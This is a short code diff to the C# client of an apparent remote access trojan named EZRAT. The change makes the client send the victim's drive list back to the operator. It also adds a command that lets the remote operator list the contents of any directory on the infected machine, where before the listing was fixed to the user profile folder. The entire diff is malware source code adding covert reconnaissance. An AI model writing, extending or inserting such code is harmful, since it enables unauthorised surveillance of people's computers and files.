@@ -212,10 +212,12 @@ namespace EZRATClient
                     response += drives[i];
                     response += "¦";
                 }
+
+                SendCommand(response);
             }
-            else if (text == "lsfiles")
+            else if (text.StartsWith("lsfiles-"))
             {
-                string path = @"C:\Users\";
+                string path = text.Substring(8);
                 DirectoryInfo d = new DirectoryInfo(path);
                 List<DirectoryInfo> resD = new List<DirectoryInfo>();
                 List<FileInfo> resF = new List<FileInfo>();
@@ -231,7 +233,6 @@ namespace EZRATClient
                 catch (Exception ex)
                 {
                     Console.WriteLine(ex.Message);
-
                 }
 
 
